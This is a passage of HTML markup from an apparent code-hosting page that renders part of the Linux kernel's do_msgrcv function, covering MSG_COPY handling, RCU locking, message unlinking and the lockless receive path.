          <td id="file-do_msgrcv-c-LC15" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">if</span> (msgflg &amp; MSG_COPY) {</td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L16" class="blob-num js-line-number js-code-nav-line-number" data-line-number="16"></td>
          <td id="file-do_msgrcv-c-LC16" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">if</span> ((msgflg &amp; MSG_EXCEPT) || !(msgflg &amp; IPC_NOWAIT))</td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L17" class="blob-num js-line-number js-code-nav-line-number" data-line-number="17"></td>
          <td id="file-do_msgrcv-c-LC17" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">return</span> -EINVAL;</td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L18" class="blob-num js-line-number js-code-nav-line-number" data-line-number="18"></td>
          <td id="file-do_msgrcv-c-LC18" class="blob-code blob-code-inner js-file-line">        copy = <span class="pl-c1">prepare_copy</span>(buf, <span class="pl-c1">min_t</span>(<span class="pl-c1">size_t</span>, bufsz, ns-&gt;<span class="pl-smi">msg_ctlmax</span>));</td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L19" class="blob-num js-line-number js-code-nav-line-number" data-line-number="19"></td>
          <td id="file-do_msgrcv-c-LC19" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">if</span> (<span class="pl-c1">IS_ERR</span>(copy))</td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L20" class="blob-num js-line-number js-code-nav-line-number" data-line-number="20"></td>
          <td id="file-do_msgrcv-c-LC20" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">return</span> <span class="pl-c1">PTR_ERR</span>(copy);</td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L21" class="blob-num js-line-number js-code-nav-line-number" data-line-number="21"></td>
          <td id="file-do_msgrcv-c-LC21" class="blob-code blob-code-inner js-file-line">    }</td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L22" class="blob-num js-line-number js-code-nav-line-number" data-line-number="22"></td>
          <td id="file-do_msgrcv-c-LC22" class="blob-code blob-code-inner js-file-line">    mode = <span class="pl-c1">convert_mode</span>(&amp;msgtyp, msgflg);</td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L23" class="blob-num js-line-number js-code-nav-line-number" data-line-number="23"></td>
          <td id="file-do_msgrcv-c-LC23" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L24" class="blob-num js-line-number js-code-nav-line-number" data-line-number="24"></td>
          <td id="file-do_msgrcv-c-LC24" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">rcu_read_lock</span>();</td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L25" class="blob-num js-line-number js-code-nav-line-number" data-line-number="25"></td>
          <td id="file-do_msgrcv-c-LC25" class="blob-code blob-code-inner js-file-line">    msq = <span class="pl-c1">msq_obtain_object_check</span>(ns, msqid);</td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L26" class="blob-num js-line-number js-code-nav-line-number" data-line-number="26"></td>
          <td id="file-do_msgrcv-c-LC26" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">if</span> (<span class="pl-c1">IS_ERR</span>(msq)) {</td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L27" class="blob-num js-line-number js-code-nav-line-number" data-line-number="27"></td>
          <td id="file-do_msgrcv-c-LC27" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">rcu_read_unlock</span>();</td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L28" class="blob-num js-line-number js-code-nav-line-number" data-line-number="28"></td>
          <td id="file-do_msgrcv-c-LC28" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">free_copy</span>(copy);</td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L29" class="blob-num js-line-number js-code-nav-line-number" data-line-number="29"></td>
          <td id="file-do_msgrcv-c-LC29" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">return</span> <span class="pl-c1">PTR_ERR</span>(msq);</td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L30" class="blob-num js-line-number js-code-nav-line-number" data-line-number="30"></td>
          <td id="file-do_msgrcv-c-LC30" class="blob-code blob-code-inner js-file-line">    }</td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L31" class="blob-num js-line-number js-code-nav-line-number" data-line-number="31"></td>
          <td id="file-do_msgrcv-c-LC31" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L32" class="blob-num js-line-number js-code-nav-line-number" data-line-number="32"></td>
          <td id="file-do_msgrcv-c-LC32" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">for</span> (;;) {</td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L33" class="blob-num js-line-number js-code-nav-line-number" data-line-number="33"></td>
          <td id="file-do_msgrcv-c-LC33" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">struct</span> msg_receiver msr_d;</td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L34" class="blob-num js-line-number js-code-nav-line-number" data-line-number="34"></td>
          <td id="file-do_msgrcv-c-LC34" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L35" class="blob-num js-line-number js-code-nav-line-number" data-line-number="35"></td>
          <td id="file-do_msgrcv-c-LC35" class="blob-code blob-code-inner js-file-line">        msg = <span class="pl-c1">ERR_PTR</span>(-EACCES);</td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L36" class="blob-num js-line-number js-code-nav-line-number" data-line-number="36"></td>
          <td id="file-do_msgrcv-c-LC36" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">if</span> (<span class="pl-c1">ipcperms</span>(ns, &amp;msq-&gt;<span class="pl-smi">q_perm</span>, S_IRUGO))</td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L37" class="blob-num js-line-number js-code-nav-line-number" data-line-number="37"></td>
          <td id="file-do_msgrcv-c-LC37" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">goto</span> out_unlock1;</td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L38" class="blob-num js-line-number js-code-nav-line-number" data-line-number="38"></td>
          <td id="file-do_msgrcv-c-LC38" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L39" class="blob-num js-line-number js-code-nav-line-number" data-line-number="39"></td>
          <td id="file-do_msgrcv-c-LC39" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">ipc_lock_object</span>(&amp;msq-&gt;<span class="pl-smi">q_perm</span>);</td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L40" class="blob-num js-line-number js-code-nav-line-number" data-line-number="40"></td>
          <td id="file-do_msgrcv-c-LC40" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L41" class="blob-num js-line-number js-code-nav-line-number" data-line-number="41"></td>
          <td id="file-do_msgrcv-c-LC41" class="blob-code blob-code-inner js-file-line">        <span class="pl-c"><span class="pl-c">/*</span> raced with RMID? <span class="pl-c">*/</span></span></td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L42" class="blob-num js-line-number js-code-nav-line-number" data-line-number="42"></td>
          <td id="file-do_msgrcv-c-LC42" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">if</span> (!<span class="pl-c1">ipc_valid_object</span>(&amp;msq-&gt;<span class="pl-smi">q_perm</span>)) {</td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L43" class="blob-num js-line-number js-code-nav-line-number" data-line-number="43"></td>
          <td id="file-do_msgrcv-c-LC43" class="blob-code blob-code-inner js-file-line">            msg = <span class="pl-c1">ERR_PTR</span>(-EIDRM);</td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L44" class="blob-num js-line-number js-code-nav-line-number" data-line-number="44"></td>
          <td id="file-do_msgrcv-c-LC44" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">goto</span> out_unlock0;</td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L45" class="blob-num js-line-number js-code-nav-line-number" data-line-number="45"></td>
          <td id="file-do_msgrcv-c-LC45" class="blob-code blob-code-inner js-file-line">        }</td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L46" class="blob-num js-line-number js-code-nav-line-number" data-line-number="46"></td>
          <td id="file-do_msgrcv-c-LC46" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L47" class="blob-num js-line-number js-code-nav-line-number" data-line-number="47"></td>
          <td id="file-do_msgrcv-c-LC47" class="blob-code blob-code-inner js-file-line">        msg = <span class="pl-c1">find_msg</span>(msq, &amp;msgtyp, mode);</td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L48" class="blob-num js-line-number js-code-nav-line-number" data-line-number="48"></td>
          <td id="file-do_msgrcv-c-LC48" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">if</span> (!<span class="pl-c1">IS_ERR</span>(msg)) {</td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L49" class="blob-num js-line-number js-code-nav-line-number" data-line-number="49"></td>
          <td id="file-do_msgrcv-c-LC49" class="blob-code blob-code-inner js-file-line">            <span class="pl-c"><span class="pl-c">/*</span></span></td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L50" class="blob-num js-line-number js-code-nav-line-number" data-line-number="50"></td>
          <td id="file-do_msgrcv-c-LC50" class="blob-code blob-code-inner js-file-line"><span class="pl-c">             * Found a suitable message.</span></td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L51" class="blob-num js-line-number js-code-nav-line-number" data-line-number="51"></td>
          <td id="file-do_msgrcv-c-LC51" class="blob-code blob-code-inner js-file-line"><span class="pl-c">             * Unlink it from the queue.</span></td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L52" class="blob-num js-line-number js-code-nav-line-number" data-line-number="52"></td>
          <td id="file-do_msgrcv-c-LC52" class="blob-code blob-code-inner js-file-line"><span class="pl-c">             <span class="pl-c">*/</span></span></td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L53" class="blob-num js-line-number js-code-nav-line-number" data-line-number="53"></td>
          <td id="file-do_msgrcv-c-LC53" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">if</span> ((bufsz &lt; msg-&gt;<span class="pl-smi">m_ts</span>) &amp;&amp; !(msgflg &amp; MSG_NOERROR)) {</td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L54" class="blob-num js-line-number js-code-nav-line-number" data-line-number="54"></td>
          <td id="file-do_msgrcv-c-LC54" class="blob-code blob-code-inner js-file-line">                msg = <span class="pl-c1">ERR_PTR</span>(-E2BIG);</td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L55" class="blob-num js-line-number js-code-nav-line-number" data-line-number="55"></td>
          <td id="file-do_msgrcv-c-LC55" class="blob-code blob-code-inner js-file-line">                <span class="pl-k">goto</span> out_unlock0;</td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L56" class="blob-num js-line-number js-code-nav-line-number" data-line-number="56"></td>
          <td id="file-do_msgrcv-c-LC56" class="blob-code blob-code-inner js-file-line">            }</td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L57" class="blob-num js-line-number js-code-nav-line-number" data-line-number="57"></td>
          <td id="file-do_msgrcv-c-LC57" class="blob-code blob-code-inner js-file-line">            <span class="pl-c"><span class="pl-c">/*</span></span></td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L58" class="blob-num js-line-number js-code-nav-line-number" data-line-number="58"></td>
          <td id="file-do_msgrcv-c-LC58" class="blob-code blob-code-inner js-file-line"><span class="pl-c">             * If we are copying, then do not unlink message and do</span></td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L59" class="blob-num js-line-number js-code-nav-line-number" data-line-number="59"></td>
          <td id="file-do_msgrcv-c-LC59" class="blob-code blob-code-inner js-file-line"><span class="pl-c">             * not update queue parameters.</span></td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L60" class="blob-num js-line-number js-code-nav-line-number" data-line-number="60"></td>
          <td id="file-do_msgrcv-c-LC60" class="blob-code blob-code-inner js-file-line"><span class="pl-c">             <span class="pl-c">*/</span></span></td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L61" class="blob-num js-line-number js-code-nav-line-number" data-line-number="61"></td>
          <td id="file-do_msgrcv-c-LC61" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">if</span> (msgflg &amp; MSG_COPY) {</td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L62" class="blob-num js-line-number js-code-nav-line-number" data-line-number="62"></td>
          <td id="file-do_msgrcv-c-LC62" class="blob-code blob-code-inner js-file-line">                msg = <span class="pl-c1">copy_msg</span>(msg, copy);</td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L63" class="blob-num js-line-number js-code-nav-line-number" data-line-number="63"></td>
          <td id="file-do_msgrcv-c-LC63" class="blob-code blob-code-inner js-file-line">                <span class="pl-k">goto</span> out_unlock0;</td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L64" class="blob-num js-line-number js-code-nav-line-number" data-line-number="64"></td>
          <td id="file-do_msgrcv-c-LC64" class="blob-code blob-code-inner js-file-line">            }</td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L65" class="blob-num js-line-number js-code-nav-line-number" data-line-number="65"></td>
          <td id="file-do_msgrcv-c-LC65" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L66" class="blob-num js-line-number js-code-nav-line-number" data-line-number="66"></td>
          <td id="file-do_msgrcv-c-LC66" class="blob-code blob-code-inner js-file-line">            <span class="pl-c1">list_del</span>(&amp;msg-&gt;<span class="pl-smi">m_list</span>);</td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L67" class="blob-num js-line-number js-code-nav-line-number" data-line-number="67"></td>
          <td id="file-do_msgrcv-c-LC67" class="blob-code blob-code-inner js-file-line">            msq-&gt;<span class="pl-smi">q_qnum</span>--;</td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L68" class="blob-num js-line-number js-code-nav-line-number" data-line-number="68"></td>
          <td id="file-do_msgrcv-c-LC68" class="blob-code blob-code-inner js-file-line">            msq-&gt;<span class="pl-smi">q_rtime</span> = <span class="pl-c1">ktime_get_real_seconds</span>();</td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L69" class="blob-num js-line-number js-code-nav-line-number" data-line-number="69"></td>
          <td id="file-do_msgrcv-c-LC69" class="blob-code blob-code-inner js-file-line">            <span class="pl-c1">ipc_update_pid</span>(&amp;msq-&gt;<span class="pl-smi">q_lrpid</span>, <span class="pl-c1">task_tgid</span>(current));</td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L70" class="blob-num js-line-number js-code-nav-line-number" data-line-number="70"></td>
          <td id="file-do_msgrcv-c-LC70" class="blob-code blob-code-inner js-file-line">            msq-&gt;<span class="pl-smi">q_cbytes</span> -= msg-&gt;<span class="pl-smi">m_ts</span>;</td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L71" class="blob-num js-line-number js-code-nav-line-number" data-line-number="71"></td>
          <td id="file-do_msgrcv-c-LC71" class="blob-code blob-code-inner js-file-line">            <span class="pl-c1">atomic_sub</span>(msg-&gt;<span class="pl-smi">m_ts</span>, &amp;ns-&gt;<span class="pl-smi">msg_bytes</span>);</td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L72" class="blob-num js-line-number js-code-nav-line-number" data-line-number="72"></td>
          <td id="file-do_msgrcv-c-LC72" class="blob-code blob-code-inner js-file-line">            <span class="pl-c1">atomic_dec</span>(&amp;ns-&gt;<span class="pl-smi">msg_hdrs</span>);</td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L73" class="blob-num js-line-number js-code-nav-line-number" data-line-number="73"></td>
          <td id="file-do_msgrcv-c-LC73" class="blob-code blob-code-inner js-file-line">            <span class="pl-c1">ss_wakeup</span>(msq, &amp;wake_q, <span class="pl-c1">false</span>);</td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L74" class="blob-num js-line-number js-code-nav-line-number" data-line-number="74"></td>
          <td id="file-do_msgrcv-c-LC74" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L75" class="blob-num js-line-number js-code-nav-line-number" data-line-number="75"></td>
          <td id="file-do_msgrcv-c-LC75" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">goto</span> out_unlock0;</td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L76" class="blob-num js-line-number js-code-nav-line-number" data-line-number="76"></td>
          <td id="file-do_msgrcv-c-LC76" class="blob-code blob-code-inner js-file-line">        }</td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L77" class="blob-num js-line-number js-code-nav-line-number" data-line-number="77"></td>
          <td id="file-do_msgrcv-c-LC77" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L78" class="blob-num js-line-number js-code-nav-line-number" data-line-number="78"></td>
          <td id="file-do_msgrcv-c-LC78" class="blob-code blob-code-inner js-file-line">        <span class="pl-c"><span class="pl-c">/*</span> No message waiting. Wait for a message <span class="pl-c">*/</span></span></td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L79" class="blob-num js-line-number js-code-nav-line-number" data-line-number="79"></td>
          <td id="file-do_msgrcv-c-LC79" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">if</span> (msgflg &amp; IPC_NOWAIT) {</td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L80" class="blob-num js-line-number js-code-nav-line-number" data-line-number="80"></td>
          <td id="file-do_msgrcv-c-LC80" class="blob-code blob-code-inner js-file-line">            msg = <span class="pl-c1">ERR_PTR</span>(-ENOMSG);</td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L81" class="blob-num js-line-number js-code-nav-line-number" data-line-number="81"></td>
          <td id="file-do_msgrcv-c-LC81" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">goto</span> out_unlock0;</td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L82" class="blob-num js-line-number js-code-nav-line-number" data-line-number="82"></td>
          <td id="file-do_msgrcv-c-LC82" class="blob-code blob-code-inner js-file-line">        }</td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L83" class="blob-num js-line-number js-code-nav-line-number" data-line-number="83"></td>
          <td id="file-do_msgrcv-c-LC83" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L84" class="blob-num js-line-number js-code-nav-line-number" data-line-number="84"></td>
          <td id="file-do_msgrcv-c-LC84" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">list_add_tail</span>(&amp;msr_d.<span class="pl-smi">r_list</span>, &amp;msq-&gt;<span class="pl-smi">q_receivers</span>);</td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L85" class="blob-num js-line-number js-code-nav-line-number" data-line-number="85"></td>
          <td id="file-do_msgrcv-c-LC85" class="blob-code blob-code-inner js-file-line">        msr_d.<span class="pl-smi">r_tsk</span> = current;</td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L86" class="blob-num js-line-number js-code-nav-line-number" data-line-number="86"></td>
          <td id="file-do_msgrcv-c-LC86" class="blob-code blob-code-inner js-file-line">        msr_d.<span class="pl-smi">r_msgtype</span> = msgtyp;</td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L87" class="blob-num js-line-number js-code-nav-line-number" data-line-number="87"></td>
          <td id="file-do_msgrcv-c-LC87" class="blob-code blob-code-inner js-file-line">        msr_d.<span class="pl-smi">r_mode</span> = mode;</td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L88" class="blob-num js-line-number js-code-nav-line-number" data-line-number="88"></td>
          <td id="file-do_msgrcv-c-LC88" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">if</span> (msgflg &amp; MSG_NOERROR)</td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L89" class="blob-num js-line-number js-code-nav-line-number" data-line-number="89"></td>
          <td id="file-do_msgrcv-c-LC89" class="blob-code blob-code-inner js-file-line">            msr_d.<span class="pl-smi">r_maxsize</span> = INT_MAX;</td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L90" class="blob-num js-line-number js-code-nav-line-number" data-line-number="90"></td>
          <td id="file-do_msgrcv-c-LC90" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">else</span></td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L91" class="blob-num js-line-number js-code-nav-line-number" data-line-number="91"></td>
          <td id="file-do_msgrcv-c-LC91" class="blob-code blob-code-inner js-file-line">            msr_d.<span class="pl-smi">r_maxsize</span> = bufsz;</td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L92" class="blob-num js-line-number js-code-nav-line-number" data-line-number="92"></td>
          <td id="file-do_msgrcv-c-LC92" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L93" class="blob-num js-line-number js-code-nav-line-number" data-line-number="93"></td>
          <td id="file-do_msgrcv-c-LC93" class="blob-code blob-code-inner js-file-line">        <span class="pl-c"><span class="pl-c">/*</span> memory barrier not require due to ipc_lock_object() <span class="pl-c">*/</span></span></td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L94" class="blob-num js-line-number js-code-nav-line-number" data-line-number="94"></td>
          <td id="file-do_msgrcv-c-LC94" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">WRITE_ONCE</span>(msr_d.<span class="pl-smi">r_msg</span>, <span class="pl-c1">ERR_PTR</span>(-EAGAIN));</td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L95" class="blob-num js-line-number js-code-nav-line-number" data-line-number="95"></td>
          <td id="file-do_msgrcv-c-LC95" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L96" class="blob-num js-line-number js-code-nav-line-number" data-line-number="96"></td>
          <td id="file-do_msgrcv-c-LC96" class="blob-code blob-code-inner js-file-line">        <span class="pl-c"><span class="pl-c">/*</span> memory barrier not required, we own ipc_lock_object() <span class="pl-c">*/</span></span></td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L97" class="blob-num js-line-number js-code-nav-line-number" data-line-number="97"></td>
          <td id="file-do_msgrcv-c-LC97" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">__set_current_state</span>(TASK_INTERRUPTIBLE);</td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L98" class="blob-num js-line-number js-code-nav-line-number" data-line-number="98"></td>
          <td id="file-do_msgrcv-c-LC98" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L99" class="blob-num js-line-number js-code-nav-line-number" data-line-number="99"></td>
          <td id="file-do_msgrcv-c-LC99" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">ipc_unlock_object</span>(&amp;msq-&gt;<span class="pl-smi">q_perm</span>);</td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L100" class="blob-num js-line-number js-code-nav-line-number" data-line-number="100"></td>
          <td id="file-do_msgrcv-c-LC100" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">rcu_read_unlock</span>();</td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L101" class="blob-num js-line-number js-code-nav-line-number" data-line-number="101"></td>
          <td id="file-do_msgrcv-c-LC101" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">schedule</span>();</td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L102" class="blob-num js-line-number js-code-nav-line-number" data-line-number="102"></td>
          <td id="file-do_msgrcv-c-LC102" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L103" class="blob-num js-line-number js-code-nav-line-number" data-line-number="103"></td>
          <td id="file-do_msgrcv-c-LC103" class="blob-code blob-code-inner js-file-line">        <span class="pl-c"><span class="pl-c">/*</span></span></td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L104" class="blob-num js-line-number js-code-nav-line-number" data-line-number="104"></td>
          <td id="file-do_msgrcv-c-LC104" class="blob-code blob-code-inner js-file-line"><span class="pl-c">         * Lockless receive, part 1:</span></td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L105" class="blob-num js-line-number js-code-nav-line-number" data-line-number="105"></td>
          <td id="file-do_msgrcv-c-LC105" class="blob-code blob-code-inner js-file-line"><span class="pl-c">         * We don't hold a reference to the queue and getting a</span></td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L106" class="blob-num js-line-number js-code-nav-line-number" data-line-number="106"></td>
          <td id="file-do_msgrcv-c-LC106" class="blob-code blob-code-inner js-file-line"><span class="pl-c">         * reference would defeat the idea of a lockless operation,</span></td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L107" class="blob-num js-line-number js-code-nav-line-number" data-line-number="107"></td>
          <td id="file-do_msgrcv-c-LC107" class="blob-code blob-code-inner js-file-line"><span class="pl-c">         * thus the code relies on rcu to guarantee the existence of</span></td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L108" class="blob-num js-line-number js-code-nav-line-number" data-line-number="108"></td>
          <td id="file-do_msgrcv-c-LC108" class="blob-code blob-code-inner js-file-line"><span class="pl-c">         * msq:</span></td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L109" class="blob-num js-line-number js-code-nav-line-number" data-line-number="109"></td>
          <td id="file-do_msgrcv-c-LC109" class="blob-code blob-code-inner js-file-line"><span class="pl-c">         * Prior to destruction, expunge_all(-EIRDM) changes r_msg.</span></td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L110" class="blob-num js-line-number js-code-nav-line-number" data-line-number="110"></td>
          <td id="file-do_msgrcv-c-LC110" class="blob-code blob-code-inner js-file-line"><span class="pl-c">         * Thus if r_msg is -EAGAIN, then the queue not yet destroyed.</span></td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L111" class="blob-num js-line-number js-code-nav-line-number" data-line-number="111"></td>
          <td id="file-do_msgrcv-c-LC111" class="blob-code blob-code-inner js-file-line"><span class="pl-c">         <span class="pl-c">*/</span></span></td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L112" class="blob-num js-line-number js-code-nav-line-number" data-line-number="112"></td>
          <td id="file-do_msgrcv-c-LC112" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">rcu_read_lock</span>();</td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L113" class="blob-num js-line-number js-code-nav-line-number" data-line-number="113"></td>
          <td id="file-do_msgrcv-c-LC113" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L114" class="blob-num js-line-number js-code-nav-line-number" data-line-number="114"></td>
          <td id="file-do_msgrcv-c-LC114" class="blob-code blob-code-inner js-file-line">        <span class="pl-c"><span class="pl-c">/*</span></span></td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L115" class="blob-num js-line-number js-code-nav-line-number" data-line-number="115"></td>
          <td id="file-do_msgrcv-c-LC115" class="blob-code blob-code-inner js-file-line"><span class="pl-c">         * Lockless receive, part 2:</span></td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L116" class="blob-num js-line-number js-code-nav-line-number" data-line-number="116"></td>
          <td id="file-do_msgrcv-c-LC116" class="blob-code blob-code-inner js-file-line"><span class="pl-c">         * The work in pipelined_send() and expunge_all():</span></td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L117" class="blob-num js-line-number js-code-nav-line-number" data-line-number="117"></td>
          <td id="file-do_msgrcv-c-LC117" class="blob-code blob-code-inner js-file-line"><span class="pl-c">         * - Set pointer to message</span></td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L118" class="blob-num js-line-number js-code-nav-line-number" data-line-number="118"></td>
          <td id="file-do_msgrcv-c-LC118" class="blob-code blob-code-inner js-file-line"><span class="pl-c">         * - Queue the receiver task for later wakeup</span></td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L119" class="blob-num js-line-number js-code-nav-line-number" data-line-number="119"></td>
          <td id="file-do_msgrcv-c-LC119" class="blob-code blob-code-inner js-file-line"><span class="pl-c">         * - Wake up the process after the lock is dropped.</span></td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L120" class="blob-num js-line-number js-code-nav-line-number" data-line-number="120"></td>
          <td id="file-do_msgrcv-c-LC120" class="blob-code blob-code-inner js-file-line"><span class="pl-c">         *</span></td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L121" class="blob-num js-line-number js-code-nav-line-number" data-line-number="121"></td>
          <td id="file-do_msgrcv-c-LC121" class="blob-code blob-code-inner js-file-line"><span class="pl-c">         * Should the process wake up before this wakeup (due to a</span></td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L122" class="blob-num js-line-number js-code-nav-line-number" data-line-number="122"></td>
          <td id="file-do_msgrcv-c-LC122" class="blob-code blob-code-inner js-file-line"><span class="pl-c">         * signal) it will either see the message and continue ...</span></td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L123" class="blob-num js-line-number js-code-nav-line-number" data-line-number="123"></td>
